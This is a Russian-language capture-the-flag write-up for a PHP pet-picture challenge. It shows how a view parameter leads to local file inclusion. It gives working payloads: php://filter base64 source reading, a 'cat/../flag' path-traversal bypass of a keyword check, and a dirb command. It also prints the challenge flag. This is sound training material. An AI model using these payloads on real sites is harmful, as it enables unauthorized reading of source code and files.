# –†–µ—à–µ–Ω–∏–µ

–ú–æ–∂–Ω–æ –∑–∞–º–µ—Ç–∏—Ç—å, —á—Ç–æ –ø—Ä–∏ –Ω–∞–∂–∞—Ç–∏–∏ –Ω–∞ –∫–Ω–æ–ø–∫–∏ –≤—ã–±–æ—Ä–∞, –≤ URL –ø–æ–¥—Å—Ç–∞–≤–ª—è–µ—Ç—Å—è –ø–∞—Ä–∞–º–µ—Ç—Ä `?view=...`, –∏–∑ –≤–∞—Ä–∏–∞–Ω—Ç–æ–≤ –¥–∞–µ—Ç—Å—è cat –∏ dog. 

–ê —á—Ç–æ, –µ—Å–ª–∏ —è —Ö–æ—á—É –¥–æ–º–∞—à–Ω—é—é –ª–æ—à–∞–¥—å? –ü–æ–¥—Å—Ç–∞–≤–ª—è–µ–º –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä `horse`, –Ω–æ –ø–æ–ª—É—á–∞–µ–º –≤ –æ—Ç–≤–µ—Ç –ª–∏—à—å 
`ü§î –ú—ã –Ω–µ –Ω–∞—à–ª–∏ –≤–∞–º –ø–∏—Ç–æ–º—Ü–∞... –ü–æ–∏—â–∏—Ç–µ —Å–æ–±–∞–∫ –∏–ª–∏ –∫–æ—à–µ–∫`

–î–∞–ª—å—à–µ —É –≤–∞—Å –µ—Å—Ç—å 2 –ø—É—Ç–∏:

### 1a. –≠–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç–∞–ª—å–Ω—ã–π (—Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è)

–ü–æ–¥—Å—Ç–∞–≤–ª—è–µ–º –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä `cats` –≤–º–µ—Å—Ç–æ `cat` –∏ –ø–æ–ª—É—á–∞–µ–º –æ—à–∏–±–∫—É:
```
Warning: include(cats.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 33


Warning: include(): Failed opening 'cats.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 33
```

–°—Ç–∞–Ω–æ–≤–∏—Ç—Å—è –ø–æ–Ω—è—Ç–Ω–æ, —á—Ç–æ
- `cat` –∏ `dog` —ç—Ç–æ —Ñ–∞–π–ª—ã `cat.php` –∏ `dog.php`, –∫–æ—Ç–æ—Ä—ã–µ –Ω–∞–º –∏ –≤—ã–≤–æ–¥—è—Ç –∫–∞—Ä—Ç–∏–Ω–∫–∏. –ò—Ö –∏–º–ø–æ—Ä—Ç–∏—Ä—É–µ—Ç `index.php`
- –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –∫–∞–∫–∞—è-—Ç–æ –ø—Ä–æ–≤–µ—Ä–∫–∞ –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –Ω–∞–ª–∏—á–∏—è —Å–ª–æ–≤ `cat` –∏–ª–∏ `dog` –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä–µ
- –í –∫–æ–Ω–µ—Ü –¥–æ–±–∞–≤–ª—è–µ—Ç—Å—è —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ `.php`

### 1b. –ë—Ä—É—Ç—Ñ–æ—Ä—Å –ø—É—Ç–∏ —á–µ—Ä–µ–∑ dirb/gobuster –∏ –ø–æ–¥–æ–±–Ω—ã–µ

–ú–æ–ª–æ–¥—Ü—ã, –Ω–∞—à–ª–∏ `cat.php`, `dog.php`, `index.php` –∏ `flag.php` –∑–∞ —Å—á–µ—Ç 
```bash
dirb http://.../ -X .php
```
–ü–µ—Ä–µ—à–ª–∏ –ø–æ —Å—Å—ã–ª–∫–∞–º –∏ —É–≤–∏–¥–µ–ª–∏ —Ç–µ –∂–µ –∫–∞—Ä—Ç–∏–Ω–∫–∏, –∞ –∑–Ω–∞—á–∏—Ç `index.php` –¥–µ–ª–∞–µ—Ç –∏–Ω–∫–ª—é–¥ `dog.php` –∏ `cat.php`

### 2. –ß–∏—Ç–∞–µ–º —Ñ–∞–π–ª—ã

–ù–∞–º –Ω—É–∂–Ω–æ –ø—Ä–æ—á–∏—Ç–∞—Ç—å –∏—Å—Ö–æ–¥–Ω—ã–π –∫–æ–¥ —Å–∞–π—Ç–∞, —á—Ç–æ–±—ã –ø–æ–Ω—è—Ç—å, –∫–∞–∫ –æ–Ω —Ä–∞–±–æ—Ç–∞–µ—Ç, –∏ –≥–¥–µ –∏—Å–∫–∞—Ç—å —Ñ–ª–∞–≥. –î–ª—è —ç—Ç–æ–≥–æ –≤–æ—Å–ø–æ–ª—å–∑—É–µ–º—Å—è
–Ω–µ–ø–æ–ø—É–ª—è—Ä–Ω–æ–π –æ—Å–æ–±–µ–Ω–Ω–æ—Å—Ç—å—é —è–∑—ã–∫–∞ PHP: —Ñ–∏–ª—å—Ç—Ä—ã.

–í PHP, –ø—Ä–∏ —á—Ç–µ–Ω–∏–∏ —Ñ–∞–π–ª–æ–≤ –º–æ–∂–Ω–æ —É–∫–∞–∑—ã–≤–∞—Ç—å —Ä–µ—Å—É—Ä—Å—ã –≤—Ä–æ–¥–µ `http://`, `file://` –∏ –ø—Ä–æ—á–∏–µ. –û–¥–Ω–∏–º –∏–∑ –Ω–∏—Ö —è–≤–ª—è–µ—Ç—Å—è `filter://`,
–∫–æ—Ç–æ—Ä—ã–π –ø—Ä–æ–≤–æ–¥–∏—Ç –∫–∞–∫–∏–µ-–ª–∏–±–æ –æ–ø–µ—Ä–∞—Ü–∏–∏ –ø–µ—Ä–µ–¥ –≤—ã–≤–æ–¥–æ–º –¥–∞–Ω–Ω—ã—Ö –∏–ª–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –∏—Ö –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é. –ù–∞–ø—Ä–∏–º–µ—Ä:
```php
<?php
    // –°–æ–¥–µ—Ä–∂–∏–º–æ–µ hello.txt: Hello, vrnctf!
    echo file_get_contents('php://filter/string.toupper/resource=hello.txt');
    // –í—ã–≤–µ–¥–µ—Ç: HELLO, VRNCTF!
?>
```

–°—Ä–µ–¥–∏ –≤—Å–µ—Ö —Ñ–∏–ª—å—Ç—Ä–æ–≤, –µ—Å—Ç—å —Ç–∞–∫–æ–π, –∫–æ—Ç–æ—Ä—ã–π –Ω–∞–º –ø–æ–º–æ–∂–µ—Ç –ª–µ–≥–∫–æ –ø—Ä–æ—á–∏—Ç–∞—Ç—å –∏—Å—Ö–æ–¥–Ω—ã–π –∫–æ–¥, –Ω–µ –≤—ã–ø–æ–ª–Ω—è—è –µ–≥–æ:
```
php://filter/convert.base64-encode/resource=...
```

–ü—Ä–∏–º–µ–Ω—è–µ–º –µ–≥–æ, —É—á–∏—Ç—ã–≤–∞—è –ø—Ä–æ–≤–µ—Ä–∫—É –Ω–∞–ª–∏—á–∏—è `cat` –∏–ª–∏ `dog` –≤ —Å—Ç—Ä–æ–∫–µ, –∏...
```bash
$ curl 'http://URL/?view=php://filter/convert.base64-encode/resource=cat'
...
PGltZyBjbGFzcz0idy0yLzMiIHNyYz0iaW1nL2NhdHMvPD9waHAgIGVjaG8gcmFuZCgxLDEwKTsgPz4uanBnIiAvPg0KPD9waHANCi8vINCa0L7RgtGLINCyINC70Y7QsdC+0Lwg0YHQu9GD0YfQsNC1INC70YPRh9GI0LUgKNCh0L/QsNGB0LjRgtC1ISDQnNC10L3RjyDQtNC10YDQttCw0YIg0LIg0LfQsNC70L7QttC90LjQutCw0YUsINGPINC+0YHRgtCw0LLQuNC7INCy0LDQvCBmbGFnLnBocCDQv9C+0LrQsCDQstGB0LUg0LXRidC1INC20LjQsiwg0LLRgdGPINC90LDQtNC10LbQtNCwINC90LAg0LLQsNGBKQ0KPz4=    
...
```

–î–µ–∫–æ–¥–∏—Ä—É–µ–º Base64 —Å—Ç—Ä–æ–∫—É –∏ –ø–æ–ª—É—á–∞–µ–º –∫–æ–¥:
```php
<img class="w-2/3" src="img/cats/<?php  echo rand(1,10); ?>.jpg" />
<?php
// –ö–æ—Ç—ã –≤ –ª—é–±–æ–º —Å–ª—É—á–∞–µ –ª—É—á—à–µ (–°–ø–∞—Å–∏—Ç–µ! –ú–µ–Ω—è –¥–µ—Ä–∂–∞—Ç –≤ –∑–∞–ª–æ–∂–Ω–∏–∫–∞—Ö, —è –æ—Å—Ç–∞–≤–∏–ª –≤–∞–º flag.php –ø–æ–∫–∞ –≤—Å–µ –µ—â–µ –∂–∏–≤, –≤—Å—è –Ω–∞–¥–µ–∂–¥–∞ –Ω–∞ –≤–∞—Å)
?>
```

–ü—Ä–æ–≤–æ–¥–∏–º —Ç–∞–∫—É—é –∂–µ –º–∞–Ω–∏–ø—É–ª—è—Ü–∏—é –¥–ª—è —á—Ç–µ–Ω–∏—è —Ñ–∞–π–ª–∞ `flag.php`:
```bash
$ curl 'http://URL/?view=php://filter/convert.base64-encode/resource=cat/../flag'
...
PD9waHANCi8vIHZybmN0ZntGMWx0M3IxbmdfRDBuM193cjBuZ30NCmVjaG8gJ1NvIG5lYXIsIHlldCBzb21laG93IG91dCBvZiByZWFjaCc7DQo/Pg==
...
```

–ò –ø–æ–ª—É—á–∞–µ–º
```php
<?php
// vrnctf{F1lt3r1ng_D0n3_wr0ng}
echo 'So near, yet somehow out of reach';
?>
```

> –ó–¥–µ—Å—å –º—ã –ø—Ä–∏–º–µ–Ω–∏–ª–∏ –æ–±—Ö–æ–¥ –ø—Ä–æ–≤–µ—Ä–∫–∏ –Ω–∞–ª–∏—á–∏—è `cat` –≤ —Å—Ç—Ä–æ–∫–µ: `cat/../flag`, –≤ –∏—Ç–æ–≥–µ –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–æ–π–¥–µ–Ω–∞, –∞ —Ñ–∞–π–ª–æ–≤–∞—è —Å–∏—Å—Ç–µ–º–∞
> —É–ø—Ä–æ—â–∞–µ—Ç –ø—É—Ç—å –¥–æ `./flag`